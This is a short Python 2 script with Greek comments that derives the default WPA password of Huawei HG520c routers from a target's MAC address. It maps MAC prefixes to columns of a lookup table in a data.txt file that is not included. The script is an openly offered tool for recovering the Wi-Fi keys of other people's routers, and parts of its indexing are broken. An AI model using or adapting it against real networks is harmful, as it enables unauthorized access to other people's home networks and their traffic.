

import sys
import fileinput

MaxMacs = 3 # Orizoume poses mac exoume sto arxeio. 

def welcome():
	print "*************************************************"
	print "Exract the right password for huawei HG520c per mac"
	print ""
	print ""
	print "Right now there is data only for E8:39:DF:FD:*:* E8:39:DF:F5:*:*"
	print "And E8:39:DF:F6:*:* ........"
	print ""
	print "If you are a owner of HG520c router please contact me in order to guide you"
	print "to complete more mac ranges in the list, thank you. -frapedas"


def GetList(stoxos, mac):
	file = open("data.txt")
	thesh = int(65535)
	while 1:
	    line = file.readline()
	    if (stoxos == thesh): 
#Edw thelw int.
			try:
				teliko = int(line.split(' ', MaxMacs)[mac],16) 
#Otan loipoyn midenika.. ta xwnoume emeis
				teliko2 = "000000"+str(teliko)
				ksekina = len(str(teliko))-8
				teliko2 = teliko2[ksekina+6:14:1] 
				print ""
				print ""
				print "************************************************************"
				return "To WPA Vrethike: " + teliko2;
	 		except Exception:
			  print "Sorry... den vrethike"
  			  sys.exc_clear()

	    thesh= thesh - 1
	    if not line:
	        break
	    pass # do something


welcome()
Thima=raw_input("\n Mac Stoxou: ").replace(':','')

if (len(Thima) != 12):
	print "Lathos Mac........."
else: 
	seira = Thima[0:1]+Thima[1:2]+Thima[6:7]+Thima[7:8]
	seira = seira.upper()
	Stoxos = int(Thima[8:12],16)

	if (seira == "E8FD"):
		simio = 0
	elif (seira == "E8F5"):
		simio = 1
	elif (seira == "E8F6"):
		simio = 2
	elif (seira == "E8F2"):
		simio = 3
	elif (seira == "E8EC"):
		simio = 4
	elif (seira == "B40D"):
		simio = 5
	elif (seira == "B40C"):
		simio = 6
	elif (seira == "4C28"):
		simio = 7
	elif (seira == "4C0E"):
		simio = 8
	elif (seira == "4C61"):
		simio = 9
	elif (seira == "4C1E"):
		simio = 10
	else: 
		print "\n**************\nH MAC den exei ton idio algorithmo"
		simio = 11
if (simio != 11):
	print GetList(Stoxos,simio) 
	